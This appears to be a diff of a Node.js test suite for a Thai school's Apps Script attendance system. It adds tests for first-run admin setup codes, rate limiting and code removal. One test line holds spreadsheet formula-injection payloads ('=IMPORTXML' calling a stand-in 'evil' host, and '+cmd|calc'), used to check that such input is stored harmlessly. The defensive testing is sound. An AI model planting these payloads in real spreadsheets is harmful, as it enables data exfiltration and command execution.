@@ -112,7 +112,7 @@ function ok(r) { assert.strictEqual(r.ok, true, JSON.stringify(r).slice(0, 400))
 test('S01', 'SetupSystem สร้างชีตครบ 9 ชีตพร้อม Header, ค่าตั้งต้น, Pepper, โฟลเดอร์ Drive, Trigger', () => {
   const sys = newSystem({ noAdmin: true });
   const ss = sys.env.SpreadsheetApp.openById(sys.env.state.props.SPREADSHEET_ID);
-  const names = ss.getSheets().map(s => s.getName()).sort();
+  const names = ss.getSheets().map(s => s.getName()).filter(n => n !== 'เริ่มต้นใช้งาน').sort();
   assert.deepStrictEqual(names, ['AttendanceLogs', 'AuditLogs', 'CorrectionRequests', 'DailySummary', 'Employees', 'LeaveRequests', 'Sessions', 'Settings', 'WorkCalendar'].sort());
   const emp = sheet(sys, 'Employees').getRange(1, 1, 1, 19).getValues()[0];
   assert.strictEqual(emp[0], 'EmployeeID');
@@ -123,6 +123,10 @@ test('S01', 'SetupSystem สร้างชีตครบ 9 ชีตพร้�
   assert.ok(/^[a-f0-9]{64}$/.test(sys.env.state.props.PASSWORD_PEPPER));
   assert.ok(sys.env.state.props.ATTACHMENT_FOLDER_ID && sys.env.state.props.EXPORT_FOLDER_ID);
   assert.strictEqual(sys.env.state.triggers.filter(t => t.fn === 'DailyMaintenance').length, 1);
+  // ยังไม่มีผู้ดูแลระบบ → มีรหัสติดตั้งในชีต "เริ่มต้นใช้งาน" (เห็นเฉพาะเจ้าของไฟล์)
+  const code = sys.env.state.props.SETUP_CODE;
+  assert.ok(/^[A-Z2-9]{4}-[A-Z2-9]{4}-[A-Z2-9]{4}$/.test(code), code);
+  assert.ok(JSON.stringify(sheet(sys, 'เริ่มต้นใช้งาน').rows).includes(code));
 });
 
 test('S02', 'เรียก SetupSystem ซ้ำ: ไม่สร้างชีตซ้ำ ไม่ลบข้อมูลเดิม ไม่เปลี่ยน Pepper', () => {
@@ -222,6 +226,7 @@ test('B01', 'CreateFirstAdmin: ต้องตั้ง Script Properties, ส�
   const e = records(sys, 'Employees')[0];
   assert.strictEqual(e.Role, 'ADMIN'); assert.strictEqual(e.Status, 'ACTIVE'); assert.strictEqual(e.MustChangePassword, true);
   assert.ok(!('BOOTSTRAP_ADMIN_PASSWORD' in sys.env.state.props));
+  assert.ok(!('SETUP_CODE' in sys.env.state.props) && !sheet(sys, 'เริ่มต้นใช้งาน'), 'setup code must be removed');
   sys.env.state.props.BOOTSTRAP_ADMIN_PASSWORD = 'Chief2026Strong';
   assert.throws(() => sys.env.call('CreateFirstAdmin'), /มีผู้ดูแลระบบที่ใช้งานอยู่แล้ว/);
 });
@@ -400,7 +405,7 @@ test('A03', 'ฟังก์ชันที่ Browser เรียกได้ 
   const injected = ['Date', 'Intl']; // global ที่ simulator ใส่ให้ ไม่ใช่โค้ดของระบบ
   const publicFns = Object.keys(c).filter(k => typeof c[k] === 'function' && !k.endsWith('_') && !injected.includes(k)).sort();
   assert.deepStrictEqual(publicFns, ['BenchmarkPasswordHashing', 'CreateFirstAdmin', 'DailyMaintenance', 'EmergencyResetAdmin',
-    'SetupSystem', 'api', 'doGet', 'getPublicConfig', 'include', 'login', 'register'].sort());
+    'SetupSystem', 'api', 'doGet', 'firstRunSetup', 'getPublicConfig', 'include', 'login', 'register'].sort());
   assert.throws(() => sys.env.call('recordAttendance_'), /Private/);
 });
 
@@ -416,11 +421,11 @@ test('A05', 'include() คืนค่าเฉพาะไฟล์ที่อ
   const sys = newSystem();
   assert.strictEqual(sys.env.call('include', 'AdminDashboard'), '');
   assert.strictEqual(sys.env.call('include', 'AdminScript'), '');
-  assert.ok(sys.env.call('include', 'Styles').length > 100);
+  if ((process.env.GAS_SRC || 'src') === 'src') assert.ok(sys.env.call('include', 'Styles').length > 100);
   const t = addTeacher(sys, 1);
   expectErr(sys.api(t.token, 'admin.view', {}), 'FORBIDDEN');
   const v = ok(sys.api(sys.admin, 'admin.view', {}));
-  assert.ok(v.html.length > 500 && v.script.length > 500);
+  assert.ok(v.html.length > 500 && (v.script.length > 500 || v.html.includes('window.Admin = ')));
 });
 
 test('A06', 'บุคลากรไม่สามารถเข้าถึงข้อมูล/ไฟล์แนบ/ใบลาของผู้อื่น', () => {
@@ -981,6 +986,74 @@ test('W03', 'ข้อความที่ขึ้นต้นด้วย = +
   assert.strictEqual(rec.Reason, '=IMPORTXML("http://evil","//a")'); assert.strictEqual(rec.ReviewNote, '+cmd|calc');
 });
 
+
+/* ================================================================== FIRST RUN (ติดตั้งแบบง่าย) */
+function freshEnv() {
+  // ติดตั้งแบบง่าย: วางโค้ด → Deploy → เปิดเว็บ (ไม่รัน SetupSystem จาก Editor)
+  const env = createGasEnv({ printErrors: !!process.env.DEBUG });
+  env.state.props.PBKDF2_ITERATIONS = '20000';
+  env.clock.setBkk('2026-11-09 07:00:00');
+  env.state.activeEmail = ''; // ผู้เยี่ยมชมเว็บแอป
+  return env;
+}
+const ADMIN_FORM = { fullName: 'นายผู้ดูแล คนแรก', staffCode: 'A001', position: 'ครู', username: 'first.admin', password: 'FirstAdm1n2026', confirmPassword: 'FirstAdm1n2026' };
+
+test('F01', 'ติดตั้งอัตโนมัติเมื่อเปิดเว็บครั้งแรก: สร้างฐานข้อมูล/ชีต/กุญแจ และรหัสติดตั้ง (ไม่เปิดเผยรหัสในหน้าเว็บ)', () => {
+  const env = freshEnv();
+  const cfg = ok(env.call('getPublicConfig'));
+  assert.strictEqual(cfg.setupComplete, true); assert.strictEqual(cfg.needsFirstAdmin, true);
+  const p = env.state.props;
+  assert.ok(p.SPREADSHEET_ID && p.PASSWORD_PEPPER && p.SETUP_CODE);
+  assert.ok(!JSON.stringify(cfg).includes(p.SETUP_CODE) && !JSON.stringify(cfg).includes(p.SPREADSHEET_ID));
+  const ss = env.SpreadsheetApp.openById(p.SPREADSHEET_ID);
+  assert.strictEqual(ss.getName(), 'ฐานข้อมูลระบบลงเวลา โรงเรียนวัดเสาหิน');
+  assert.strictEqual(ss.getSheets().length, 10);
+  assert.ok(JSON.stringify(ss.getSheetByName('เริ่มต้นใช้งาน').rows).includes(p.SETUP_CODE));
+  const html = env.context.doGet({}).getContent();
+  assert.ok(!html.includes(p.SETUP_CODE));
+  const again = ok(env.call('getPublicConfig'));
+  assert.strictEqual(env.state.props.SETUP_CODE, p.SETUP_CODE); assert.strictEqual(again.needsFirstAdmin, true);
+});
+
+test('F02', 'รหัสติดตั้งผิด → ปฏิเสธ และจำกัดจำนวนครั้ง (20 ครั้ง/ชม.)', () => {
+  const env = freshEnv();
+  env.call('getPublicConfig');
+  const r = expectErr(env.call('firstRunSetup', Object.assign({ setupCode: 'AAAA-BBBB-CCCC' }, ADMIN_FORM)), 'VALIDATION');
+  assert.strictEqual(r.data.field, 'setupCode');
+  expectErr(env.call('firstRunSetup', Object.assign({ setupCode: '' }, ADMIN_FORM)), 'VALIDATION');
+  for (let i = 0; i < 19; i++) env.call('firstRunSetup', Object.assign({ setupCode: 'WRONG-' + i }, ADMIN_FORM));
+  expectErr(env.call('firstRunSetup', Object.assign({ setupCode: env.state.props.SETUP_CODE }, ADMIN_FORM)), 'LOCKED');
+  assert.strictEqual(env.SpreadsheetApp.openById(env.state.props.SPREADSHEET_ID).getSheetByName('Employees')._records().length, 0);
+});
+
+test('F03', 'รหัสถูกต้อง → สร้างผู้ดูแลระบบ + ตั้งพิกัด/เวลา + เข้าสู่ระบบทันที; รหัสถูกลบ; ใช้ซ้ำไม่ได้', () => {
+  const env = freshEnv();
+  env.call('getPublicConfig');
+  const code = env.state.props.SETUP_CODE;
+  expectErr(env.call('firstRunSetup', Object.assign({ setupCode: code }, ADMIN_FORM, { password: 'short', confirmPassword: 'short' })), 'VALIDATION');
+  expectErr(env.call('firstRunSetup', Object.assign({ setupCode: code, settings: { WORK_START_TIME: '09:00', LATE_AFTER_TIME: '08:00' } }, ADMIN_FORM)), 'VALIDATION');
+  const d = ok(env.call('firstRunSetup', Object.assign({ setupCode: code.toLowerCase().replace(/-/g, ' '), settings: {
+    SCHOOL_LAT: '18.7883', SCHOOL_LNG: '98.9853', WORK_START_TIME: '07:30', LATE_AFTER_TIME: '08:00', WORK_END_TIME: '16:30', SETTINGS_CONFIRMED: true } }, ADMIN_FORM)));
+  assert.strictEqual(d.user.role, 'ADMIN'); assert.strictEqual(d.mustChangePassword, false);
+  const ov = ok(env.call('api', d.token, 'admin.overview', {}));
+  assert.deepStrictEqual(ov.warnings, []);
+  const st = ok(env.call('api', d.token, 'settings.get', {})).values;
+  assert.deepStrictEqual([st.SCHOOL_LAT, st.WORK_START_TIME, st.LATE_AFTER_TIME, st.SETTINGS_CONFIRMED], ['18.7883', '07:30', '08:00', 'TRUE']);
+  assert.ok(!('SETUP_CODE' in env.state.props));
+  assert.strictEqual(env.SpreadsheetApp.openById(env.state.props.SPREADSHEET_ID).getSheetByName('เริ่มต้นใช้งาน'), null);
+  assert.strictEqual(ok(env.call('getPublicConfig')).needsFirstAdmin, false);
+  expectErr(env.call('firstRunSetup', Object.assign({ setupCode: code }, ADMIN_FORM, { username: 'second.admin', staffCode: 'A002' })), 'ALREADY_SETUP');
+  ok(env.call('login', 'first.admin', 'FirstAdm1n2026', {}));
+  const aud = env.SpreadsheetApp.openById(env.state.props.SPREADSHEET_ID).getSheetByName('AuditLogs')._records();
+  assert.ok(aud.some(a => a.Action === 'FIRST_RUN_SETUP'));
+});
+
+test('F04', 'ระบบที่ติดตั้งแบบเดิม (CreateFirstAdmin) ไม่แสดงหน้าติดตั้ง และเรียก firstRunSetup ไม่ได้', () => {
+  const sys = newSystem();
+  assert.strictEqual(ok(sys.env.call('getPublicConfig')).needsFirstAdmin, false);
+  expectErr(sys.env.call('firstRunSetup', Object.assign({ setupCode: 'ABCD-EFGH-JKLM' }, ADMIN_FORM)), 'ALREADY_SETUP');
+});
+
 /* ================================================================== RUN */
 (function run() {
   const results = [];
@@ -1000,6 +1073,8 @@ test('W03', 'ข้อความที่ขึ้นต้นด้วย = +
   const md = ['# ผลการทดสอบ Backend (Apps Script simulator)', '', `รันเมื่อ: ${new Date().toISOString()}  `, `Node.js ${process.version}  `, `ผลรวม: **${passed}/${results.length} ผ่าน**`, '',
     '| รหัส | รายการทดสอบ | ผล | เวลา (ms) |', '|---|---|---|---|',
     ...results.map(r => `| ${r.id} | ${r.name} | ${r.ok ? '✅ ผ่าน' : '❌ ไม่ผ่าน'} | ${r.ms} |`), ''];
-  fs.writeFileSync(path.join(dir, 'backend-results.md'), md.join('\n'));
+  const variant = (process.env.GAS_SRC || 'src') === 'dist' ? '-dist' : '';
+  if (variant) md[0] += ' — ชุดติดตั้งแบบง่าย (dist/ 3 ไฟล์)';
+  fs.writeFileSync(path.join(dir, 'backend-results' + variant + '.md'), md.join('\n'));
   process.exitCode = passed === results.length ? 0 : 1;
 })();
